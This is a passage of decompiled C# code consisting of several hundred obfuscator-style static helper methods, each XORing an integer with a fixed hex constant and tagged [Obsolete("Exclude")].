	[Obsolete("Exclude")]
	public static int smethod_3611(int int_4)
	{
		return int_4 ^ 0x3377DA4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3612(int int_4)
	{
		return int_4 ^ 0x5856535A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3613(int int_4)
	{
		return int_4 ^ 0x625355D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3614(int int_4)
	{
		return int_4 ^ 0x6F06BDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3615(int int_4)
	{
		return int_4 ^ 0x1BA13BAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3616(int int_4)
	{
		return int_4 ^ 0x4C114350;
	}

	[Obsolete("Exclude")]
	public static int smethod_3617(int int_4)
	{
		return int_4 ^ 0x1C77D94B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3618(int int_4)
	{
		return int_4 ^ 0xFE89E31;
	}

	[Obsolete("Exclude")]
	public static int smethod_3619(int int_4)
	{
		return int_4 ^ 0x7BE04CDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3620(int int_4)
	{
		return int_4 ^ 0x8FAF3C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3621(int int_4)
	{
		return int_4 ^ 0x720CB81D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3622(int int_4)
	{
		return int_4 ^ 0x510C9E41;
	}

	[Obsolete("Exclude")]
	public static int smethod_3623(int int_4)
	{
		return int_4 ^ 0x14D8B298;
	}

	[Obsolete("Exclude")]
	public static int smethod_3624(int int_4)
	{
		return int_4 ^ 0x146A29E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3625(int int_4)
	{
		return int_4 ^ 0x28324B87;
	}

	[Obsolete("Exclude")]
	public static int smethod_3626(int int_4)
	{
		return int_4 ^ 0x36EC7D2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3627(int int_4)
	{
		return int_4 ^ 0x15B7FF33;
	}

	[Obsolete("Exclude")]
	public static int smethod_3628(int int_4)
	{
		return int_4 ^ 0x12DC3AAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3629(int int_4)
	{
		return int_4 ^ 0x2F71B04F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3630(int int_4)
	{
		return int_4 ^ 0x2FC75258;
	}

	[Obsolete("Exclude")]
	public static int smethod_3631(int int_4)
	{
		return int_4 ^ 0xE172E9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3632(int int_4)
	{
		return int_4 ^ 0x5B64160E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3633(int int_4)
	{
		return int_4 ^ 0x6B56E7CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3634(int int_4)
	{
		return int_4 ^ 0x656A6090;
	}

	[Obsolete("Exclude")]
	public static int smethod_3635(int int_4)
	{
		return int_4 ^ 0x75F4D0E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3636(int int_4)
	{
		return int_4 ^ 0x4A0E1E4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3637(int int_4)
	{
		return int_4 ^ 0x10FAAF14;
	}

	[Obsolete("Exclude")]
	public static int smethod_3638(int int_4)
	{
		return int_4 ^ 0x7367DE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3639(int int_4)
	{
		return int_4 ^ 0x27B7BB91;
	}

	[Obsolete("Exclude")]
	public static int smethod_3640(int int_4)
	{
		return int_4 ^ 0x34C7D183;
	}

	[Obsolete("Exclude")]
	public static int smethod_3641(int int_4)
	{
		return int_4 ^ 0x24EE65A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3642(int int_4)
	{
		return int_4 ^ 0x177D9ADD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3643(int int_4)
	{
		return int_4 ^ 0x73BC5D7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3644(int int_4)
	{
		return int_4 ^ 0x55F68F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3645(int int_4)
	{
		return int_4 ^ 0xCCD1063;
	}

	[Obsolete("Exclude")]
	public static int smethod_3646(int int_4)
	{
		return int_4 ^ 0x2DFE5B28;
	}

	[Obsolete("Exclude")]
	public static int smethod_3647(int int_4)
	{
		return int_4 ^ 0x4E056C66;
	}

	[Obsolete("Exclude")]
	public static int smethod_3648(int int_4)
	{
		return int_4 ^ 0x540615F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3649(int int_4)
	{
		return int_4 ^ 0x69DE5F4B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3650(int int_4)
	{
		return int_4 ^ 0x7C7037C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3651(int int_4)
	{
		return int_4 ^ 0x592D325F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3652(int int_4)
	{
		return int_4 ^ 0x6C371410;
	}

	[Obsolete("Exclude")]
	public static int smethod_3653(int int_4)
	{
		return int_4 ^ 0x3DB1E63D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3654(int int_4)
	{
		return int_4 ^ 0x1E3F6BFD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3655(int int_4)
	{
		return int_4 ^ 0x1783A19A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3656(int int_4)
	{
		return int_4 ^ 0x196B8489;
	}

	[Obsolete("Exclude")]
	public static int smethod_3657(int int_4)
	{
		return int_4 ^ 0x7FAC671D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3658(int int_4)
	{
		return int_4 ^ 0xB6C75B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3659(int int_4)
	{
		return int_4 ^ 0x2D112ACF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3660(int int_4)
	{
		return int_4 ^ 0x588B39F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3661(int int_4)
	{
		return int_4 ^ 0x6B039B7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3662(int int_4)
	{
		return int_4 ^ 0xDB56551;
	}

	[Obsolete("Exclude")]
	public static int smethod_3663(int int_4)
	{
		return int_4 ^ 0x38AFBB15;
	}

	[Obsolete("Exclude")]
	public static int smethod_3664(int int_4)
	{
		return int_4 ^ 0x4EF1B05B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3665(int int_4)
	{
		return int_4 ^ 0x7F03265D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3666(int int_4)
	{
		return int_4 ^ 0x4071D113;
	}

	[Obsolete("Exclude")]
	public static int smethod_3667(int int_4)
	{
		return int_4 ^ 0x4C5E3E07;
	}

	[Obsolete("Exclude")]
	public static int smethod_3668(int int_4)
	{
		return int_4 ^ 0x1F2FF506;
	}

	[Obsolete("Exclude")]
	public static int smethod_3669(int int_4)
	{
		return int_4 ^ 0x6C9C9649;
	}

	[Obsolete("Exclude")]
	public static int smethod_3670(int int_4)
	{
		return int_4 ^ 0x1F702539;
	}

	[Obsolete("Exclude")]
	public static int smethod_3671(int int_4)
	{
		return int_4 ^ 0x41292D0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3672(int int_4)
	{
		return int_4 ^ 0x558E7340;
	}

	[Obsolete("Exclude")]
	public static int smethod_3673(int int_4)
	{
		return int_4 ^ 0xC5B09E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3674(int int_4)
	{
		return int_4 ^ 0x2AA9E142;
	}

	[Obsolete("Exclude")]
	public static int smethod_3675(int int_4)
	{
		return int_4 ^ 0x52AD20E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3676(int int_4)
	{
		return int_4 ^ 0x581CEDD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3677(int int_4)
	{
		return int_4 ^ 0x4C0FB6C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3678(int int_4)
	{
		return int_4 ^ 0x5236C3D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3679(int int_4)
	{
		return int_4 ^ 0x2DA63E9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3680(int int_4)
	{
		return int_4 ^ 0x69D98ECC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3681(int int_4)
	{
		return int_4 ^ 0x2DCDF7E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3682(int int_4)
	{
		return int_4 ^ 0x174B6C2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3683(int int_4)
	{
		return int_4 ^ 0x1B4EFD48;
	}

	[Obsolete("Exclude")]
	public static int smethod_3684(int int_4)
	{
		return int_4 ^ 0x68DE3D9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3685(int int_4)
	{
		return int_4 ^ 0x61307AF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3686(int int_4)
	{
		return int_4 ^ 0x7BE10327;
	}

	[Obsolete("Exclude")]
	public static int smethod_3687(int int_4)
	{
		return int_4 ^ 0x3060FD6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3688(int int_4)
	{
		return int_4 ^ 0x7B3DD3F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3689(int int_4)
	{
		return int_4 ^ 0x6ECF6D15;
	}

	[Obsolete("Exclude")]
	public static int smethod_3690(int int_4)
	{
		return int_4 ^ 0x5FA8994D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3691(int int_4)
	{
		return int_4 ^ 0x57BE73C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3692(int int_4)
	{
		return int_4 ^ 0x5BE04098;
	}

	[Obsolete("Exclude")]
	public static int smethod_3693(int int_4)
	{
		return int_4 ^ 0x1367E3FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3694(int int_4)
	{
		return int_4 ^ 0x6D1ACB04;
	}

	[Obsolete("Exclude")]
	public static int smethod_3695(int int_4)
	{
		return int_4 ^ 0x49FC6926;
	}

	[Obsolete("Exclude")]
	public static int smethod_3696(int int_4)
	{
		return int_4 ^ 0x113C5678;
	}

	[Obsolete("Exclude")]
	public static int smethod_3697(int int_4)
	{
		return int_4 ^ 0x504532EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3698(int int_4)
	{
		return int_4 ^ 0x3A65FB97;
	}

	[Obsolete("Exclude")]
	public static int smethod_3699(int int_4)
	{
		return int_4 ^ 0x1E975054;
	}

	[Obsolete("Exclude")]
	public static int smethod_3700(int int_4)
	{
		return int_4 ^ 0x2BF230B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3701(int int_4)
	{
		return int_4 ^ 0x5572CD20;
	}

	[Obsolete("Exclude")]
	public static int smethod_3702(int int_4)
	{
		return int_4 ^ 0x301090D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3703(int int_4)
	{
		return int_4 ^ 0x5427E42D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3704(int int_4)
	{
		return int_4 ^ 0x795F08DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3705(int int_4)
	{
		return int_4 ^ 0x5DAC55B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3706(int int_4)
	{
		return int_4 ^ 0x3C94093E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3707(int int_4)
	{
		return int_4 ^ 0x6D9EA36D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3708(int int_4)
	{
		return int_4 ^ 0x32743C7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3709(int int_4)
	{
		return int_4 ^ 0x4226FCCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3710(int int_4)
	{
		return int_4 ^ 0x281E6AD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3711(int int_4)
	{
		return int_4 ^ 0x2D087AFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3712(int int_4)
	{
		return int_4 ^ 0x5BE883B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3713(int int_4)
	{
		return int_4 ^ 0x92E189D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3714(int int_4)
	{
		return int_4 ^ 0x63F45748;
	}

	[Obsolete("Exclude")]
	public static int smethod_3715(int int_4)
	{
		return int_4 ^ 0xADDA528;
	}

	[Obsolete("Exclude")]
	public static int smethod_3716(int int_4)
	{
		return int_4 ^ 0x7B2EBF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3717(int int_4)
	{
		return int_4 ^ 0x167E2A8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3718(int int_4)
	{
		return int_4 ^ 0x2893C89F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3719(int int_4)
	{
		return int_4 ^ 0x283F00EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3720(int int_4)
	{
		return int_4 ^ 0x32F6F6D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3721(int int_4)
	{
		return int_4 ^ 0x7B0D894C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3722(int int_4)
	{
		return int_4 ^ 0x1370EFEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3723(int int_4)
	{
		return int_4 ^ 0x14233373;
	}

	[Obsolete("Exclude")]
	public static int smethod_3724(int int_4)
	{
		return int_4 ^ 0x1393992E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3725(int int_4)
	{
		return int_4 ^ 0x7F3AAB25;
	}

	[Obsolete("Exclude")]
	public static int smethod_3726(int int_4)
	{
		return int_4 ^ 0x3CFD52DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3727(int int_4)
	{
		return int_4 ^ 0x64EFEDB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3728(int int_4)
	{
		return int_4 ^ 0x18A3066F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3729(int int_4)
	{
		return int_4 ^ 0x6A6B1EE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3730(int int_4)
	{
		return int_4 ^ 0x62ABB4E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3731(int int_4)
	{
		return int_4 ^ 0x28D57F06;
	}

	[Obsolete("Exclude")]
	public static int smethod_3732(int int_4)
	{
		return int_4 ^ 0x46050604;
	}

	[Obsolete("Exclude")]
	public static int smethod_3733(int int_4)
	{
		return int_4 ^ 0x374731F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3734(int int_4)
	{
		return int_4 ^ 0x7791DFC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3735(int int_4)
	{
		return int_4 ^ 0x4510B311;
	}

	[Obsolete("Exclude")]
	public static int smethod_3736(int int_4)
	{
		return int_4 ^ 0x6FE7D2FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3737(int int_4)
	{
		return int_4 ^ 0x3FEF14;
	}

	[Obsolete("Exclude")]
	public static int smethod_3738(int int_4)
	{
		return int_4 ^ 0x68C38DD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3739(int int_4)
	{
		return int_4 ^ 0x7CC7529A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3740(int int_4)
	{
		return int_4 ^ 0x6CAE6055;
	}

	[Obsolete("Exclude")]
	public static int smethod_3741(int int_4)
	{
		return int_4 ^ 0x3C504F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3742(int int_4)
	{
		return int_4 ^ 0x7ECCD8A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3743(int int_4)
	{
		return int_4 ^ 0x6E77BE93;
	}

	[Obsolete("Exclude")]
	public static int smethod_3744(int int_4)
	{
		return int_4 ^ 0x438AF3FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3745(int int_4)
	{
		return int_4 ^ 0x65880EFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3746(int int_4)
	{
		return int_4 ^ 0x69AC4A0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3747(int int_4)
	{
		return int_4 ^ 0x2150B8EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3748(int int_4)
	{
		return int_4 ^ 0x395948C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3749(int int_4)
	{
		return int_4 ^ 0x4B2FCB4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3750(int int_4)
	{
		return int_4 ^ 0x664E05AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3751(int int_4)
	{
		return int_4 ^ 0x12B2673A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3752(int int_4)
	{
		return int_4 ^ 0x62F8598C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3753(int int_4)
	{
		return int_4 ^ 0x5CDC4A63;
	}

	[Obsolete("Exclude")]
	public static int smethod_3754(int int_4)
	{
		return int_4 ^ 0x603CC108;
	}

	[Obsolete("Exclude")]
	public static int smethod_3755(int int_4)
	{
		return int_4 ^ 0x584ABCC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3756(int int_4)
	{
		return int_4 ^ 0x7F057078;
	}

	[Obsolete("Exclude")]
	public static int smethod_3757(int int_4)
	{
		return int_4 ^ 0x66C616EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3758(int int_4)
	{
		return int_4 ^ 0x5B8CB6D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3759(int int_4)
	{
		return int_4 ^ 0x5B5CE245;
	}

	[Obsolete("Exclude")]
	public static int smethod_3760(int int_4)
	{
		return int_4 ^ 0x250A2D96;
	}

	[Obsolete("Exclude")]
	public static int smethod_3761(int int_4)
	{
		return int_4 ^ 0x13A478FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3762(int int_4)
	{
		return int_4 ^ 0x6B50AB0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3763(int int_4)
	{
		return int_4 ^ 0x22C0B33D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3764(int int_4)
	{
		return int_4 ^ 0x608A17FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3765(int int_4)
	{
		return int_4 ^ 0x40C5E5C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3766(int int_4)
	{
		return int_4 ^ 0x65CFE8AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3767(int int_4)
	{
		return int_4 ^ 0x34947F92;
	}

	[Obsolete("Exclude")]
	public static int smethod_3768(int int_4)
	{
		return int_4 ^ 0x3A947B19;
	}

	[Obsolete("Exclude")]
	public static int smethod_3769(int int_4)
	{
		return int_4 ^ 0xD8F0E5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3770(int int_4)
	{
		return int_4 ^ 0x7F8ED5FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3771(int int_4)
	{
		return int_4 ^ 0x2B9F8452;
	}

	[Obsolete("Exclude")]
	public static int smethod_3772(int int_4)
	{
		return int_4 ^ 0x3D5F0F78;
	}

	[Obsolete("Exclude")]
	public static int smethod_3773(int int_4)
	{
		return int_4 ^ 0x7FCA3268;
	}

	[Obsolete("Exclude")]
	public static int smethod_3774(int int_4)
	{
		return int_4 ^ 0x164E592F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3775(int int_4)
	{
		return int_4 ^ 0x47549F9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3776(int int_4)
	{
		return int_4 ^ 0x1B185734;
	}

	[Obsolete("Exclude")]
	public static int smethod_3777(int int_4)
	{
		return int_4 ^ 0x2350CC5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3778(int int_4)
	{
		return int_4 ^ 0x7847FC0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3779(int int_4)
	{
		return int_4 ^ 0x2D74EAC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3780(int int_4)
	{
		return int_4 ^ 0x41B3F4F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3781(int int_4)
	{
		return int_4 ^ 0x4BA64686;
	}

	[Obsolete("Exclude")]
	public static int smethod_3782(int int_4)
	{
		return int_4 ^ 0x1FD48CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3783(int int_4)
	{
		return int_4 ^ 0x4096798A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3784(int int_4)
	{
		return int_4 ^ 0x6B546656;
	}

	[Obsolete("Exclude")]
	public static int smethod_3785(int int_4)
	{
		return int_4 ^ 0x221FE1C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3786(int int_4)
	{
		return int_4 ^ 0x7089ECF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3787(int int_4)
	{
		return int_4 ^ 0x250CEF70;
	}

	[Obsolete("Exclude")]
	public static int smethod_3788(int int_4)
	{
		return int_4 ^ 0x39CC0CE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3789(int int_4)
	{
		return int_4 ^ 0x5E1379F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3790(int int_4)
	{
		return int_4 ^ 0x467ECA35;
	}

	[Obsolete("Exclude")]
	public static int smethod_3791(int int_4)
	{
		return int_4 ^ 0x7FD23A3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3792(int int_4)
	{
		return int_4 ^ 0x37F0D526;
	}

	[Obsolete("Exclude")]
	public static int smethod_3793(int int_4)
	{
		return int_4 ^ 0x6293B243;
	}

	[Obsolete("Exclude")]
	public static int smethod_3794(int int_4)
	{
		return int_4 ^ 0x693EAFF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3795(int int_4)
	{
		return int_4 ^ 0x55F7E6DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3796(int int_4)
	{
		return int_4 ^ 0x9E73B3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3797(int int_4)
	{
		return int_4 ^ 0x5D22A338;
	}

	[Obsolete("Exclude")]
	public static int smethod_3798(int int_4)
	{
		return int_4 ^ 0x6301DEFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3799(int int_4)
	{
		return int_4 ^ 0x2F27BF6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3800(int int_4)
	{
		return int_4 ^ 0x1308F88F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3801(int int_4)
	{
		return int_4 ^ 0x1A8EAE59;
	}

	[Obsolete("Exclude")]
	public static int smethod_3802(int int_4)
	{
		return int_4 ^ 0xEE80D34;
	}

	[Obsolete("Exclude")]
	public static int smethod_3803(int int_4)
	{
		return int_4 ^ 0x69A0E6CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3804(int int_4)
	{
		return int_4 ^ 0x7E5FCCB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3805(int int_4)
	{
		return int_4 ^ 0x68C769A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3806(int int_4)
	{
		return int_4 ^ 0x4940124A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3807(int int_4)
	{
		return int_4 ^ 0x2DFE424D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3808(int int_4)
	{
		return int_4 ^ 0x1A1C4CE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3809(int int_4)
	{
		return int_4 ^ 0xD36E867;
	}

	[Obsolete("Exclude")]
	public static int smethod_3810(int int_4)
	{
		return int_4 ^ 0x3F6D8092;
	}

	[Obsolete("Exclude")]
	public static int smethod_3811(int int_4)
	{
		return int_4 ^ 0x1F3E7A92;
	}

	[Obsolete("Exclude")]
	public static int smethod_3812(int int_4)
	{
		return int_4 ^ 0x3C260F54;
	}

	[Obsolete("Exclude")]
	public static int smethod_3813(int int_4)
	{
		return int_4 ^ 0x1B2A922F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3814(int int_4)
	{
		return int_4 ^ 0x316D8FBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3815(int int_4)
	{
		return int_4 ^ 0x4B657A07;
	}

	[Obsolete("Exclude")]
	public static int smethod_3816(int int_4)
	{
		return int_4 ^ 0x74AC0E0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3818(int int_4)
	{
		return int_4 ^ 0x5096FA5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3819(int int_4)
	{
		return int_4 ^ 0x6274A1E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3820(int int_4)
	{
		return int_4 ^ 0x11E8EBD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3821(int int_4)
	{
		return int_4 ^ 0x6B078479;
	}

	[Obsolete("Exclude")]
	public static int smethod_3822(int int_4)
	{
		return int_4 ^ 0x182CD628;
	}

	[Obsolete("Exclude")]
	public static int smethod_3823(int int_4)
	{
		return int_4 ^ 0x674F0617;
	}

	[Obsolete("Exclude")]
	public static int smethod_3824(int int_4)
	{
		return int_4 ^ 0x19FECF64;
	}

	[Obsolete("Exclude")]
	public static int smethod_3825(int int_4)
	{
		return int_4 ^ 0x249A2189;
	}

	[Obsolete("Exclude")]
	public static int smethod_3826(int int_4)
	{
		return int_4 ^ 0x27B92FF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3827(int int_4)
	{
		return int_4 ^ 0x4ABD60F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3828(int int_4)
	{
		return int_4 ^ 0x358095A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3829(int int_4)
	{
		return int_4 ^ 0x40BEF3DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3830(int int_4)
	{
		return int_4 ^ 0x146B80B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3831(int int_4)
	{
		return int_4 ^ 0x187F6A62;
	}

	[Obsolete("Exclude")]
	public static int smethod_3832(int int_4)
	{
		return int_4 ^ 0x727BB26B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3833(int int_4)
	{
		return int_4 ^ 0x569BDE18;
	}

	[Obsolete("Exclude")]
	public static int smethod_3834(int int_4)
	{
		return int_4 ^ 0x6B45955E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3835(int int_4)
	{
		return int_4 ^ 0x58912137;
	}

	[Obsolete("Exclude")]
	public static int smethod_3836(int int_4)
	{
		return int_4 ^ 0x6CB714C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3837(int int_4)
	{
		return int_4 ^ 0x22871C20;
	}

	[Obsolete("Exclude")]
	public static int smethod_3838(int int_4)
	{
		return int_4 ^ 0x614AB466;
	}

	[Obsolete("Exclude")]
	public static int smethod_3839(int int_4)
	{
		return int_4 ^ 0x6A21E134;
	}

	[Obsolete("Exclude")]
	public static int smethod_3840(int int_4)
	{
		return int_4 ^ 0x33F4B754;
	}

	[Obsolete("Exclude")]
	public static int smethod_3841(int int_4)
	{
		return int_4 ^ 0x5F17C604;
	}

	[Obsolete("Exclude")]
	public static int smethod_3842(int int_4)
	{
		return int_4 ^ 0x1BBFD6C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3843(int int_4)
	{
		return int_4 ^ 0x65E4158B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3844(int int_4)
	{
		return int_4 ^ 0x70700D15;
	}

	[Obsolete("Exclude")]
	public static int smethod_3845(int int_4)
	{
		return int_4 ^ 0x133B4D3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3846(int int_4)
	{
		return int_4 ^ 0x615CF32D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3847(int int_4)
	{
		return int_4 ^ 0x1BFFF943;
	}

	[Obsolete("Exclude")]
	public static int smethod_3848(int int_4)
	{
		return int_4 ^ 0x40E8E0F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3849(int int_4)
	{
		return int_4 ^ 0x6E8A3DFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3850(int int_4)
	{
		return int_4 ^ 0x4DC6DA6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3851(int int_4)
	{
		return int_4 ^ 0x2081FE3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3852(int int_4)
	{
		return int_4 ^ 0x12F7E1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3853(int int_4)
	{
		return int_4 ^ 0x24F825D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3854(int int_4)
	{
		return int_4 ^ 0x768E66BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3855(int int_4)
	{
		return int_4 ^ 0x2CB348EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3856(int int_4)
	{
		return int_4 ^ 0xE0260A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3857(int int_4)
	{
		return int_4 ^ 0x6EE7B06D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3858(int int_4)
	{
		return int_4 ^ 0x2CA0A458;
	}

	[Obsolete("Exclude")]
	public static int smethod_3859(int int_4)
	{
		return int_4 ^ 0xFDB9F95;
	}

	[Obsolete("Exclude")]
	public static int smethod_3860(int int_4)
	{
		return int_4 ^ 0xF0D4247;
	}

	[Obsolete("Exclude")]
	public static int smethod_3861(int int_4)
	{
		return int_4 ^ 0x3AEEE285;
	}

	[Obsolete("Exclude")]
	public static int smethod_3862(int int_4)
	{
		return int_4 ^ 0x350D0022;
	}

	[Obsolete("Exclude")]
	public static int smethod_3863(int int_4)
	{
		return int_4 ^ 0x750FED7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3864(int int_4)
	{
		return int_4 ^ 0x6F52A0A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3865(int int_4)
	{
		return int_4 ^ 0x12BBD81E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3866(int int_4)
	{
		return int_4 ^ 0x5151ADA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3867(int int_4)
	{
		return int_4 ^ 0x47D7EEB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3868(int int_4)
	{
		return int_4 ^ 0x2267A617;
	}

	[Obsolete("Exclude")]
	public static int smethod_3869(int int_4)
	{
		return int_4 ^ 0x61E126CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3870(int int_4)
	{
		return int_4 ^ 0x4BB0B34D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3871(int int_4)
	{
		return int_4 ^ 0x46FAEAC4;
	}

